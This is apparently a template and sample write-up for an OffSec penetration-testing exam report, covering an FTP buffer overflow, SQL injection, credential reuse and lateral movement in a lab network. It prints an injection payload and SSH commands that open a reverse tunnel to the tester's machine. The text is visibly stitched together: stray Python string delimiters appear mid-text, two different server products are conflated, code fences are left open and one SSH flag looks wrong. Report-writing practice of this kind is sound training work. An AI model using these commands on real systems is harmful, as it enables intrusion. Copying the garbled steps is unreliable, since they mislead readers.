    # OffSec Certified Professional Exam Report {.in-toc.numbered}

    ## Introduction {.in-toc .numbered}
    The OffSec Certified Professional exam report contains all efforts that were conducted in order to pass the OffSec Certified Professional exam. This report should contain all items that were used to pass the overall exam and it will be graded from a standpoint of correctness and fullness to all aspects of the exam. The purpose of this report is to ensure that the student has a full understanding of penetration testing methodologies as well as the technical knowledge to pass the qualifications for the OffSec Certified Professional.

    ## Objective {.in-toc.numbered}
    The objective of this assessment is to perform an internal penetration test against the OffSec Lab and Exam network. The student is tasked with following a methodical approach to obtaining access to the objective goals. This test should simulate an actual penetration test and how you would start from beginning to end, including the overall report. An example page has already been created for you in the latter portions of this document that should give you ample information on what is expected to pass this course. Use the sample report as a guideline to get you through the reporting.

    ## Requirements {.in-toc.numbered}
    The student will be required to fill out this penetration testing report fully and to include the following sections:
    * Overall High-Level Summary and Recommendations (non-technical)
    * Methodology walkthrough and detailed outline of steps taken
    * Each finding with included screenshots, walkthrough, sample code, and proof.txt if applicable.
    * Any additional items that were not included

**FTP Enumeration**
Upon manual enumeration of the available FTP service, John noticed it was running an outdated version 2.3.4 that is prone to the remote buffer overflow vulnerability.
"""
initialaccess = """
**Vulnerability Explanation:** Ability Server 2.34 is subject to a buffer overflow vulnerability in STOR field. Attackers can use this vulnerability to cause arbitrary remote code execution and take completely control over the system.

**Vulnerability Fix:** The publishers of the Ability Server have issued a patch to fix this known issue. It can be found here: [http://www.code-crafters.com/abilityserver/](http://www.code-crafters.com/abilityserver/)

**Steps to reproduce the attack:** The operating system was different from the known public exploit. A rewritten exploit was needed in order for successful code execution to occur. Once the exploit was rewritten, a targeted attack was performed on the system which gave John full administrative access over the system.

**Vulnerability Explation:** After establishing a foothold on target, John noticed there were several applications running locally, one of them, a custom web application on port 80 was prone to SQL Injection attacks. Using Chisel for port forwarding, John was able to access the web application. When performing the penetration test, John noticed error-based MySQL Injection on the taxid query string parameter. While enumerating table data, John was able to successfully extract the database root account login and password credentials that were unencrypted that also matched username and password accounts for the administrative user account on the system and John was able to log in remotely using RDP. This allowed for a successful breach of the operating system as well as all data contained on the system.

**Vulnerability Fix:** Since this is a custom web application, a specific update will not properly solve this issue. The application will need to be programmed to properly sanitize user-input
data, ensure that the user is running off of a limited user account, and that any sensitive data stored within the SQL database is properly encrypted. Custom error messages are highly recommended, as it becomes more challenging for the attacker to exploit a given weakness if errors are not being presented back to them.

**Steps to reproduce the attack:**
```
SELECT * FROM login WHERE id = 1 or 1=1 AND user LIKE “%root%"

**System Proof Screenshot:**
TODO: screenshot

After collecting the proof files and establishing a backdoor using SSH, John began the enumeration of the filesystem for the presence of interesting files. He noticed that there was a mounted share originating from the 10.5.5.20 IP. Inspecting a custom sysreport.ps1 script in the /mnt/scripts directory he found cleartext credentials for the “sandbox\\alex” user. Taking into consideration the type of scripts in this directory and the username structure, it seems that the “Poultry” host is a part of the Active Directory environment.



John began the lateral movement by establishing a reverse dynamic port forwarding using SSH. First, he generated a new pair of SSH keys and added those to the authorized\\_keys file on his Kali VM, then he just needed to issue a single SSH port forwarding command:


```
└─$ ssh-keygen -t rsa -N ‘’ -f \\~/.ssh/key

└─$ ssh -f -N -R 1080 -o “UserKnownHostsFile=/dev/null” -o “StrictHostKeyChecking=no” -I key <kali@192.168.119.164>
```

With the dynamic reverse tunnel established, John only needed to edit the /etc/proxychains.conf to use the port 1080.
